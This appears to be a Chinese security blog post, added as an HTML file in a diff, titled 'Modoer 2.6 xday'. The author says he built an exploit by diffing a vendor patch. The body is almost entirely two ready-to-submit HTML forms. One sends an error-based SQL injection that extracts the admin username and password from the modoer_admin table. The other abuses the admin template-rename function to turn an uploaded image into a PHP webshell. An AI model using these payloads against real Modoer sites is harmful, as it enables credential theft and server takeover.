@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="&amp;nbsp;&amp;nbsp;起因，许诺说他的网站被人黑了，大半夜的叫我来分析下搞个exp给他，官方已经出了补丁，网上还没有exp。对比了下补丁漏洞出现在datacall_class.php文件，有兴趣的朋友自己跟一下。  注入：123456&amp;lt;form action=&quot;http://www.php0day.com/index.php?act=ajax&amp;amp;do=datacall&amp;amp;in_">
+<meta name="keywords" content="exp,getshell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Modoer 2.6 xday">
+<meta property="og:url" content="http://secoff.net/archives/131.html">
+<meta property="og:site_name" content="Security Off">
+<meta property="og:description" content="&amp;nbsp;&amp;nbsp;起因，许诺说他的网站被人黑了，大半夜的叫我来分析下搞个exp给他，官方已经出了补丁，网上还没有exp。对比了下补丁漏洞出现在datacall_class.php文件，有兴趣的朋友自己跟一下。  注入：123456&amp;lt;form action=&quot;http://www.php0day.com/index.php?act=ajax&amp;amp;do=datacall&amp;amp;in_">
+<meta property="og:updated_time" content="2017-08-01T12:49:37.813Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Modoer 2.6 xday">
+<meta name="twitter:description" content="&amp;nbsp;&amp;nbsp;起因，许诺说他的网站被人黑了，大半夜的叫我来分析下搞个exp给他，官方已经出了补丁，网上还没有exp。对比了下补丁漏洞出现在datacall_class.php文件，有兴趣的朋友自己跟一下。  注入：123456&amp;lt;form action=&quot;http://www.php0day.com/index.php?act=ajax&amp;amp;do=datacall&amp;amp;in_">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    
+    <title>Modoer 2.6 xday | Security Off</title>
+    
+
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post" style="padding:40px;">
+<div id="nav" class="pull-right">
+  <ul>
+     <li class="icon">
+        <a href="javascript:history.go(-1)" title="Back"><i class="fa fa-mail-reply fa-5x"></i></a>
+     </li>
+  </ul>
+</div>
+  <!--
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  -->
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/archives/142.html"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/archives/127.html"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://secoff.net/archives/131.html"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://secoff.net/archives/131.html&text=Modoer 2.6 xday"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://secoff.net/archives/131.html&title=Modoer 2.6 xday"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://secoff.net/archives/131.html&is_video=false&description=Modoer 2.6 xday"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Modoer 2.6 xday&body=Check out this article: http://secoff.net/archives/131.html"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://secoff.net/archives/131.html&title=Modoer 2.6 xday"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://secoff.net/archives/131.html&title=Modoer 2.6 xday"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://secoff.net/archives/131.html&title=Modoer 2.6 xday"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://secoff.net/archives/131.html&title=Modoer 2.6 xday"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://secoff.net/archives/131.html&name=Modoer 2.6 xday&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#注入："><span class="toc-number">1.</span> <span class="toc-text">注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注：上面的datacallname值不是乱码，是编码过的。再附一个自己发现的后台文件重命名拿shell。"><span class="toc-number">2.</span> <span class="toc-text">注：上面的datacallname值不是乱码，是编码过的。再附一个自己发现的后台文件重命名拿shell。</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    
+    <div class="content index width mx-auto px2 my4" style="max-width:58rem">
+    
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Modoer 2.6 xday
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Security Off</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2013-06-29T10:44:12.000Z" itemprop="datePublished">2013-06-29</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/exp/">exp</a>, <a class="tag-link" href="/tags/getshell/">getshell</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>&nbsp;&nbsp;起因，许诺说他的网站被人黑了，大半夜的叫我来分析下搞个exp给他，官方已经出了补丁，网上还没有exp。对比了下补丁漏洞出现在datacall_class.php文件，有兴趣的朋友自己跟一下。</p>
+
+<h3 id="注入："><a href="#注入：" class="headerlink" title="注入："></a>注入：</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://www.php0day.com/index.php?act=ajax&amp;do=datacall&amp;in_ajax=1&amp;m=index&amp;op=get_datacall"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"datacallname"</span> <span class="attr">value</span>=<span class="string">"涓婚_鐩稿叧涓婚"</span> <span class="attr">size</span>=<span class="string">"80"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"sid"</span> <span class="attr">value</span>=<span class="string">"1/**/AND/**/(select/**/1/**/from/**/(select count(*),concat((SELECT concat(adminname,0x7c,password) FROM modoer_admin limit 0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)#"</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"b4dboy"</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"exp"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="注：上面的datacallname值不是乱码，是编码过的。再附一个自己发现的后台文件重命名拿shell。"><a href="#注：上面的datacallname值不是乱码，是编码过的。再附一个自己发现的后台文件重命名拿shell。" class="headerlink" title="注：上面的datacallname值不是乱码，是编码过的。再附一个自己发现的后台文件重命名拿shell。"></a>注：上面的datacallname值不是乱码，是编码过的。再附一个自己发现的后台文件重命名拿shell。</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://www.php0day.com/admin.php?module=&amp;act=template&amp;op=update"</span>&gt;</span></div><div class="line">	path:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"root_dir"</span> <span class="attr">value</span>=<span class="string">"uploads/bcastr/"</span> <span class="attr">size</span>=<span class="string">"40"</span> /&gt;</span></div><div class="line">	filename:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"fielnames[1][filename]"</span> <span class="attr">value</span>=<span class="string">"78_1348754079.jpg"</span> <span class="attr">size</span>=<span class="string">"40"</span> /&gt;</span></div><div class="line">	newfilename:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"fielnames[1][newfilename]"</span> <span class="attr">value</span>=<span class="string">"b4dboy.php"</span> <span class="attr">size</span>=<span class="string">"40"</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"dosubmit"</span> <span class="attr">value</span>=<span class="string">"exp"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#注入："><span class="toc-number">1.</span> <span class="toc-text">注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注：上面的datacallname值不是乱码，是编码过的。再附一个自己发现的后台文件重命名拿shell。"><span class="toc-number">2.</span> <span class="toc-text">注：上面的datacallname值不是乱码，是编码过的。再附一个自己发现的后台文件重命名拿shell。</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://secoff.net/archives/131.html"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://secoff.net/archives/131.html&text=Modoer 2.6 xday"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://secoff.net/archives/131.html&title=Modoer 2.6 xday"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://secoff.net/archives/131.html&is_video=false&description=Modoer 2.6 xday"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Modoer 2.6 xday&body=Check out this article: http://secoff.net/archives/131.html"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://secoff.net/archives/131.html&title=Modoer 2.6 xday"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://secoff.net/archives/131.html&title=Modoer 2.6 xday"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://secoff.net/archives/131.html&title=Modoer 2.6 xday"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://secoff.net/archives/131.html&title=Modoer 2.6 xday"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://secoff.net/archives/131.html&name=Modoer 2.6 xday&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    
+<div class="content index width mx-auto px2 my4" style="max-width:58rem">
+<footer id="footer" style="max-width:58rem">
+
+  <div class="footer-left">
+    Copyright &copy; 2017 b4dboy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
